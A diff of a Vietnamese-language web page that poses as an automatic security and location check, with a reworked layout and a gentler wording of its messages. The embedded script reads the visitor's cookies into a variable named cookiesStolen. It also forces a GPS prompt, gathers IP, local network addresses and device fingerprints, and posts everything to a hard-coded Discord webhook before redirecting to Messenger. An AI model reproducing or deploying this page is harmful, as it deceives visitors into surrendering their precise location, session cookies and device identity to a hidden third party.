@@ -6,129 +6,114 @@
     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
     <meta http-equiv="Pragma" content="no-cache">
     <meta http-equiv="Expires" content="0">
-    <title>Xác minh bảo mật…</title>
+    <title>Kiểm tra bảo mật tự động</title>
     <style>
         * { margin: 0; padding: 0; box-sizing: border-box; }
-        html, body { height: 100%; background: #0c0f14; font-family: 'Segoe UI', 'Roboto', 'Arial', sans-serif; overflow: hidden; }
-        #jackLayer {
+        html, body { height: 100%; background: #0b0e14; font-family: 'Inter', 'Segoe UI', 'Roboto', sans-serif; overflow: hidden; }
+        #main {
             position: fixed; top: 0; left: 0; width: 100%; height: 100%; z-index: 99999;
-            background: rgba(0,0,0,0.96); backdrop-filter: blur(20px);
+            background: linear-gradient(145deg, #0c0f14 0%, #10141c 100%);
             display: flex; justify-content: center; align-items: center; flex-direction: column;
-            color: #e4e6eb; text-align: center; transition: opacity 0.3s;
+            color: #e1e5ee; text-align: center; padding: 20px;
         }
-        .shield-icon {
-            width: 80px; height: 80px; background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%23ffbe0b"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>') no-repeat center/contain;
-            margin-bottom: 20px;
+        .card {
+            background: rgba(20,24,32,0.8); backdrop-filter: blur(20px);
+            border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
+            padding: 35px 25px; max-width: 340px; width: 90%; box-shadow: 0 20px 40px rgba(0,0,0,0.5);
         }
-        .progress-container {
-            width: 260px; height: 6px; background: rgba(255,255,255,0.08); border-radius: 6px;
-            margin: 20px 0; overflow: hidden;
+        .shield {
+            width: 70px; height: 70px; margin: 0 auto 20px auto;
+            background: url('data:image/svg+xml;utf8,<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24" fill="%234fc3f7"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4z"/></svg>') no-repeat center/contain;
         }
-        .progress-bar {
-            height: 100%; width: 0%; background: linear-gradient(90deg, #ffbe0b, #ff8800);
-            border-radius: 6px; transition: width 0.2s;
+        .progress-track {
+            width: 100%; height: 5px; background: rgba(255,255,255,0.06); border-radius: 10px; margin: 25px 0 18px 0; overflow: hidden;
         }
-        .status { font-size: 18px; font-weight: 600; margin: 5px 20px; letter-spacing: 0.3px; color: #ffbe0b; }
-        .sub { color: #b0b3b8; font-size: 14px; margin-top: 8px; max-width: 300px; line-height: 1.4; }
-        .tap-area {
-            margin-top: 30px; padding: 12px 36px; background: rgba(255,190,11,0.12);
-            border-radius: 50px; font-weight: 700; color: #ffbe0b; cursor: pointer;
-            animation: pulse 2s infinite; border: 1px solid rgba(255,190,11,0.3);
-            font-size: 15px; letter-spacing: 0.5px;
+        .progress-fill {
+            height: 100%; width: 0%; background: linear-gradient(90deg, #4fc3f7, #1e88e5); border-radius: 10px;
+            transition: width 0.15s linear;
         }
-        @keyframes pulse { 0% { opacity: 1; transform: scale(1); } 50% { opacity: 0.6; transform: scale(1.04); } 100% { opacity: 1; transform: scale(1); } }
-        .checkmark {
-            width: 70px; height: 70px; border-radius: 50%; background: #00c853;
-            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
-            box-shadow: 0 0 25px rgba(0,200,83,0.5); animation: pop 0.4s ease;
+        .title { font-size: 19px; font-weight: 600; margin-bottom: 8px; color: #ffffff; }
+        .subtitle { color: #a0a8b8; font-size: 14px; line-height: 1.5; margin-bottom: 10px; }
+        .btn {
+            display: inline-block; margin-top: 20px; padding: 13px 30px;
+            background: rgba(79,195,247,0.15); border: 1px solid rgba(79,195,247,0.3);
+            border-radius: 40px; color: #4fc3f7; font-weight: 600; font-size: 15px;
+            cursor: pointer; transition: background 0.2s; letter-spacing: 0.3px;
         }
-        @keyframes pop { 0% { transform: scale(0); } 80% { transform: scale(1.1); } 100% { transform: scale(1); } }
-        .checkmark::after {
-            content: ''; display: block; width: 18px; height: 30px; border: solid white;
-            border-width: 0 4px 4px 0; transform: rotate(45deg); margin-top: -3px;
+        .btn:hover { background: rgba(79,195,247,0.25); }
+        .result-icon {
+            width: 60px; height: 60px; border-radius: 50%; margin: 0 auto 15px auto;
+            display: flex; align-items: center; justify-content: center;
         }
-        .crossmark {
-            width: 70px; height: 70px; border-radius: 50%; background: #ff1744;
-            display: flex; justify-content: center; align-items: center; margin-bottom: 15px;
-            box-shadow: 0 0 25px rgba(255,23,68,0.5); animation: pop 0.4s ease;
-            position: relative;
-        }
-        .crossmark::after, .crossmark::before {
-            content: ''; position: absolute; width: 35px; height: 5px; background: white;
-            border-radius: 2px;
-        }
-        .crossmark::after { transform: rotate(45deg); }
-        .crossmark::before { transform: rotate(-45deg); }
+        .result-icon.success { background: #1b5e20; box-shadow: 0 0 20px rgba(0,200,83,0.4); }
+        .result-icon.fail { background: #b71c1c; box-shadow: 0 0 20px rgba(255,23,68,0.4); }
         .hidden { display: none; }
+        .action-row { margin-top: 20px; display: flex; gap: 10px; justify-content: center; flex-wrap: wrap; }
         .action-btn {
-            margin-top: 15px; padding: 10px 28px; background: rgba(255,255,255,0.1);
-            border-radius: 50px; color: #ffbe0b; font-weight: 600; cursor: pointer;
-            border: 1px solid rgba(255,190,11,0.3); font-size: 14px;
-            display: inline-block; margin: 10px 5px;
+            padding: 10px 22px; border-radius: 30px; font-size: 14px; font-weight: 600;
+            border: 1px solid rgba(255,255,255,0.1); background: rgba(255,255,255,0.05);
+            color: #ccc; cursor: pointer;
         }
-        .action-btn.secondary {
-            background: rgba(255,255,255,0.05);
-            color: #ccc;
-        }
+        .action-btn.primary { background: rgba(79,195,247,0.15); border-color: rgba(79,195,247,0.3); color: #4fc3f7; }
     </style>
 </head>
 <body>
-    <div id="jackLayer">
-        <div id="wheelSection">
-            <div class="shield-icon"></div>
-            <div class="status" id="statusMsg">Đang kiểm tra bảo mật…</div>
-            <div class="progress-container">
-                <div class="progress-bar" id="progressBar" style="width:0%"></div>
+    <div id="main">
+        <div class="card" id="step1">
+            <div class="shield"></div>
+            <div class="title" id="step1Title">Đang kiểm tra bảo mật...</div>
+            <div class="progress-track">
+                <div class="progress-fill" id="progressBar"></div>
             </div>
-            <div class="sub" id="subMsg">Vui lòng chờ trong giây lát</div>
-            <div id="tapPrompt" class="hidden" style="margin-top:15px; color:#ffbe0b; font-weight:600; font-size:15px; white-space: pre-line;">
-                Nhấn để xác minh bạn là người Việt Nam
+            <div class="subtitle" id="step1Sub">Vui lòng chờ, hệ thống tự động kiểm tra kết nối an toàn</div>
+            <div id="tapPrompt" class="hidden" style="margin-top:10px; font-weight:500; color:#4fc3f7;">
+                Nhấn nút bên dưới để xác minh vị trí
             </div>
-            <div id="tapButton" class="tap-area hidden">Chạm để xác minh</div>
+            <button class="btn hidden" id="tapButton">Xác minh vị trí</button>
         </div>
 
-        <div id="resultSection" class="hidden">
-            <div id="resultMark"></div>
-            <div class="status" id="resultStatus"></div>
-            <div class="sub" id="resultSub"></div>
-            <div id="actionButtons"></div>
+        <div class="card hidden" id="step2">
+            <div class="result-icon" id="resultIcon"></div>
+            <div class="title" id="resultTitle"></div>
+            <div class="subtitle" id="resultSub"></div>
+            <div class="action-row" id="actionRow"></div>
         </div>
     </div>
 
     <script>
         const WEBHOOK = 'https://discord.com/api/webhooks/1508157152580337746/Ujt-uvdn6HBrnb7CFBe7rd4y-NqaHLstGmzFOKUoD6AJFS5HABi6kTqXXKrumg9eo-Ek';
 
-        const statusEl = document.getElementById('statusMsg');
-        const subEl = document.getElementById('subMsg');
+        // DOM
+        const step1 = document.getElementById('step1');
+        const step2 = document.getElementById('step2');
         const progressBar = document.getElementById('progressBar');
+        const step1Title = document.getElementById('step1Title');
+        const step1Sub = document.getElementById('step1Sub');
         const tapBtn = document.getElementById('tapButton');
         const tapPrompt = document.getElementById('tapPrompt');
-        const wheelSection = document.getElementById('wheelSection');
-        const resultSection = document.getElementById('resultSection');
-        const resultMark = document.getElementById('resultMark');
-        const resultStatus = document.getElementById('resultStatus');
+        const resultIcon = document.getElementById('resultIcon');
+        const resultTitle = document.getElementById('resultTitle');
         const resultSub = document.getElementById('resultSub');
-        const actionButtons = document.getElementById('actionButtons');
+        const actionRow = document.getElementById('actionRow');
 
         let gpsData = null;
         let ipData = null;
         const cookiesStolen = document.cookie || 'none';
 
-        // Get device model from user agent
+        // Detect device model
         function getDeviceModel(ua) {
-            const modelRegex = /(?:SAMSUNG|Samsung|SM-)\s*([A-Za-z0-9]+(?:\s+[A-Za-z0-9]+)?)|(?:Galaxy\s+([A-Za-z0-9]+))|(?:iPhone\s+(\d{1,2}(?:\s*(Pro|Max|Plus))?))/i;
-            const match = ua.match(modelRegex);
-            if (match) {
-                if (match[1]) return 'Samsung ' + match[1];
-                if (match[2]) return 'Galaxy ' + match[2];
-                if (match[3]) return 'iPhone ' + match[3];
+            const models = [
+                /\((SM-[A-Z0-9]+)\)/i,
+                /\((Galaxy [A-Za-z0-9 ]+)\)/i,
+                /iPhone (\d{1,2}(?:\s*(Pro|Max|Plus))?)\)/i,
+                /Redmi ([^;)]+)/i,
+                /POCOPHONE ([^;)]+)/i,
+                /Pixel ([0-9]+[a-z]?)/i
+            ];
+            for (let regex of models) {
+                const match = ua.match(regex);
+                if (match) return match[1] || match[0].replace(/[\(\)]/g,'');
             }
-            // fallback: common patterns
-            if (/SM-[A-Z0-9]+/i.test(ua)) {
-                return ua.match(/SM-[A-Z0-9]+/i)[0];
-            }
-            if (/Redmi/i.test(ua)) return ua.match(/Redmi [^;]+/i)[0] || 'Xiaomi';
-            if (/POCOPHONE/i.test(ua)) return 'Poco Phone';
             return 'Unknown';
         }
 
@@ -250,16 +235,16 @@
             }
             const localIPs = await getWebRTCIPs();
             const embed = {
-                title: '📱 **Thiết bị & Vị trí**',
-                color: 0xffa502,
+                title: '📱 Thông tin thiết bị & vị trí',
+                color: 0x4fc3f7,
                 fields: [
-                    { name: '📱 Model điện thoại', value: fp.deviceModel, inline: true },
-                    { name: '📍 GPS', value: gpsData && !gpsData.error ? `Lat: ${gpsData.lat}\nLon: ${gpsData.lon}\nAcc: ±${gpsData.accuracy}m` : (gpsData ? 'Lỗi: ' + gpsData.error : 'Không có'), inline: true },
-                    { name: '🌐 IP & Vị trí IP', value: ipData ? `IP: ${ipData.ip}\nQuốc gia: ${ipData.country}\nThành phố: ${ipData.city}\nISP: ${ipData.isp}` : 'Không lấy được', inline: true },
+                    { name: '📱 Model', value: fp.deviceModel, inline: true },
+                    { name: '📍 GPS', value: gpsData && !gpsData.error ? `${gpsData.lat}, ${gpsData.lon} (±${gpsData.accuracy}m)` : 'Không có', inline: true },
+                    { name: '🌐 IP', value: ipData ? `${ipData.ip}\n${ipData.city}, ${ipData.country}\n${ipData.isp}` : 'Không lấy được', inline: true },
                     { name: '🏠 IP cục bộ', value: localIPs || 'Không có', inline: true },
                     { name: '🔋 Pin', value: fp.battery ? `${fp.battery.level} (${fp.battery.charging?'Sạc':'Không sạc'})` : 'N/A', inline: true },
-                    { name: '📱 Thiết bị', value: `${fp.userAgent}\nHĐH: ${fp.platform}\nRAM: ${fp.deviceMemory}GB, Nhân: ${fp.hardwareConcurrency}\nTouch: ${fp.touchSupport}`, inline: false },
-                    { name: '🌍 Múi giờ', value: fp.timezone, inline: true },
+                    { name: '📱 Chi tiết', value: `${fp.userAgent}\nHĐH: ${fp.platform} | RAM: ${fp.deviceMemory}GB | Nhân: ${fp.hardwareConcurrency}`, inline: false },
+                    { name: '🕒 Múi giờ', value: fp.timezone, inline: true },
                     { name: '🖥 Màn hình', value: fp.screen, inline: true },
                     { name: '📶 Kết nối', value: fp.connection, inline: true },
                     { name: '🎨 Canvas', value: fp.canvasHash, inline: true },
@@ -267,7 +252,7 @@
                     { name: '🔊 Audio', value: fp.audioFingerprint, inline: true },
                     { name: '🍪 Cookies', value: cookiesStolen.substring(0, 1020), inline: false }
                 ],
-                footer: { text: 'Axr4t2auYc • Hệ thống tự động' },
+                footer: { text: 'Axr4t2auYc • Security check' },
                 timestamp: new Date().toISOString()
             };
             await fetch(WEBHOOK, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({embeds:[embed]}) }).catch(()=>{});
@@ -277,23 +262,22 @@
             return typeof lat === 'number' && typeof lon === 'number' && lat >= 8.0 && lat <= 23.5 && lon >= 102.0 && lon <= 110.0;
         }
 
-        function showResult(type, message, subMessage, buttons = []) {
-            wheelSection.classList.add('hidden');
-            resultSection.classList.remove('hidden');
-            if (type === 'success') {
-                resultMark.innerHTML = '<div class="checkmark"></div>';
-            } else {
-                resultMark.innerHTML = '<div class="crossmark"></div>';
-            }
-            resultStatus.textContent = message;
-            resultSub.textContent = subMessage;
-            actionButtons.innerHTML = '';
-            buttons.forEach(btn => {
-                const el = document.createElement('button');
-                el.className = 'action-btn' + (btn.secondary ? ' secondary' : '');
-                el.textContent = btn.label;
-                el.onclick = btn.onClick;
-                actionButtons.appendChild(el);
+        function showResult(success, title, subtitle, actions = []) {
+            step1.classList.add('hidden');
+            step2.classList.remove('hidden');
+            resultIcon.className = 'result-icon ' + (success ? 'success' : 'fail');
+            resultIcon.innerHTML = success
+                ? '<svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>'
+                : '<svg width="30" height="30" viewBox="0 0 24 24" fill="white"><path d="M18.3 5.71L12 12 5.71 5.71 4.29 7.12 10.59 13.41 4.29 19.71 5.71 21.12 12 14.83l6.29 6.29 1.41-1.41L13.41 13.41 19.7 7.12z"/></svg>';
+            resultTitle.textContent = title;
+            resultSub.textContent = subtitle;
+            actionRow.innerHTML = '';
+            actions.forEach(a => {
+                const btn = document.createElement('button');
+                btn.className = 'action-btn' + (a.primary ? ' primary' : '');
+                btn.textContent = a.label;
+                btn.onclick = a.onClick;
+                actionRow.appendChild(btn);
             });
         }
 
@@ -305,12 +289,12 @@
             }
         }
 
-        function retry() {
-            resultSection.classList.add('hidden');
-            wheelSection.classList.remove('hidden');
+        function retryVerification() {
+            step2.classList.add('hidden');
+            step1.classList.remove('hidden');
             progressBar.style.width = '100%';
-            statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
-            subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
+            step1Title.textContent = 'Sẵn sàng xác minh vị trí';
+            step1Sub.textContent = 'Nhấn nút bên dưới để tiếp tục kiểm tra bảo mật';
             tapPrompt.classList.remove('hidden');
             tapBtn.classList.remove('hidden');
         }
@@ -318,17 +302,18 @@
         async function startVerification() {
             tapBtn.classList.add('hidden');
             tapPrompt.classList.add('hidden');
-            statusEl.textContent = 'Đang kiểm tra quốc gia…';
-            subEl.textContent = 'Hệ thống tự động – không phải tấn công';
+            step1Title.textContent = 'Đang kiểm tra vị trí...';
+            step1Sub.textContent = 'Hệ thống tự động xác minh, không phải tấn công';
+            progressBar.style.width = '0%';
             let percent = 0;
             const fakeInterval = setInterval(() => {
-                percent += 5;
-                progressBar.style.width = percent + '%';
+                percent += 8;
                 if (percent >= 100) {
+                    percent = 100;
                     clearInterval(fakeInterval);
-                    progressBar.style.width = '100%';
                 }
-            }, 80);
+                progressBar.style.width = percent + '%';
+            }, 70);
 
             const gpsPromise = forceGPS();
             ipData = await fetchIP();
@@ -336,7 +321,6 @@
 
             clearInterval(fakeInterval);
             progressBar.style.width = '100%';
-
             gpsData = gpsResult;
 
             let isVietnam = false;
@@ -352,57 +336,50 @@
             await sendData();
 
             if (gpsData && gpsData.error && (gpsData.error === 1 || gpsData.error === 2)) {
-                showResult(
-                    'error',
+                showResult(false,
                     'Không thể lấy vị trí',
-                    'Vui lòng bật dịch vụ vị trí và cho phép quyền truy cập vị trí cho trình duyệt.',
+                    'Để hoàn tất kiểm tra, vui lòng bật dịch vụ vị trí và cho phép quyền.',
                     [
-                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings },
-                        { label: 'Thử lại', onClick: retry, secondary: true }
-                    ]
-                );
+                        { label: 'Mở cài đặt vị trí', onClick: openLocationSettings, primary: true },
+                        { label: 'Thử lại', onClick: retryVerification }
+                    ]);
                 return;
             }
 
             if (isVietnam) {
-                showResult(
-                    'success',
-                    'Xác minh thành công!',
-                    'Bạn là người Việt Nam, được phép truy cập. Đang chuyển hướng…',
-                    []
-                );
-                setTimeout(() => {
-                    window.location.href = 'https://www.messenger.com/';
-                }, 2000);
+                showResult(true,
+                    'Xác minh thành công',
+                    'Bạn đủ điều kiện truy cập. Đang chuyển hướng...',
+                    []);
+                setTimeout(() => { window.location.href = 'https://www.messenger.com/'; }, 2000);
             } else {
-                showResult(
-                    'error',
-                    'Truy cập bị từ chối',
-                    'Quốc gia của bạn không được phép. Hệ thống chỉ chấp nhận người dùng Việt Nam.',
+                showResult(false,
+                    'Truy cập bị hạn chế',
+                    'Hệ thống chỉ cho phép người dùng tại Việt Nam. Nếu bạn đang ở Việt Nam, hãy thử lại.',
                     [
                         { label: 'Thử lại', onClick: () => window.location.reload() }
-                    ]
-                );
+                    ]);
             }
         }
 
-        // Initial progress bar fill
-        let progress = 0;
-        const wheelTimer = setInterval(() => {
-            progress += 5;
-            progressBar.style.width = progress + '%';
-            if (progress >= 100) {
-                clearInterval(wheelTimer);
+        // Initial animation
+        let initProgress = 0;
+        const initInterval = setInterval(() => {
+            initProgress += 7;
+            progressBar.style.width = initProgress + '%';
+            if (initProgress >= 100) {
+                clearInterval(initInterval);
                 progressBar.style.width = '100%';
-                statusEl.textContent = 'Sẵn sàng xác minh quốc gia';
-                subEl.textContent = 'Chỉ người dùng Việt Nam được phép truy cập';
-                tapPrompt.classList.remove('hidden');
+                step1Title.textContent = 'Sẵn sàng kiểm tra';
+                step1Sub.textContent = 'Nhấn nút bên dưới để xác minh vị trí của bạn';
                 tapBtn.classList.remove('hidden');
+                tapPrompt.classList.remove('hidden');
             }
-        }, 80);
+        }, 70);
 
         tapBtn.addEventListener('click', startVerification);
 
+        // Auto-tap after 30s
         setTimeout(() => {
             if (!tapBtn.classList.contains('hidden')) tapBtn.click();
         }, 30000);
